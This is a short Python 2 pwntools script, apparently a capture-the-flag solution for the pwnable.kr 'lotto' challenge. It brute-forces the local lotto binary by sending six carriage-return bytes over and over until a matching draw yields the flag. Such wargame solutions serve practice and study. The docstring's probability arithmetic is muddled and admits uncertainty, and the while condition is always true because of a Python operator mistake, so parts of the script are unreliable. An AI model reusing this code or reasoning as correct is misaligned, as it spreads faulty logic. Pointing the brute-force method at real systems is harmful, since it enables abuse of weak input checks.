"""_summary_
Run this script INSIDE pwnable's python 2 interpreter

Works by utilizing the high success rate of about 0.36% 
(if my math is correct), so brute forcing is viable in this scenario.

(1/46) * (1/6) = ~0.0036

1/46 - one of of 46 possibilities of 13 (`\r`'s  ASCII representation is 13 decimal)
1/6 - the possibility of all of them being identical (or is it 1/36? doesn't matter, exploit gets the flag fast :))
"""

from pwn import *
context.log_level = 'debug'
message = 'Lotto Start!'
p = process('/home/lotto/lotto')
while 'Lotto Start!' or 'bad' in message:
    message = p.recv()
    p.send('1\n')
    message = p.recv()
    p.send('\r\r\r\r\r\r\n')